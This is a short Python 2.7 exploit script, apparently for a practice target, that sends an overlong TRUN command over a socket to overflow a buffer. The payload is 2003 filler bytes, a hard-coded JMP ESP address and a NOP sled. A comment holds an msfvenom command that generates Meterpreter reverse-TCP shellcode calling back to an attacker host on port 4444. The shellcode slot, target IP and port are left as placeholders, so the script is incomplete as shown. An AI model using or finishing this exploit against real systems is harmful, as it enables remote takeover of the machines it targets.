#!/usr/bin/python2.7

import socket

'''
625011AF
625011BB
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.X.X lport=4444 -b "\x00" -f python
'''


buf = "TRUN /.:/" #Exploit
buf += "A" * 2003 #Buffer Offset
buf += "\xa0\x12\x50\x62"  #JMP ESP
buf += "\x90" * 15 #NOP SLED
buf += #SHELLCODE HERE
s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) # Creates IPv4 socket

s.connect(("0.0.0.0",PORTHERE))    #IP and port to connect to
print s.recv(1024)   #print response
s.send(buf)       #sends the variable buf
print s.recv(1024)   #print response
s.close()         #close the connection
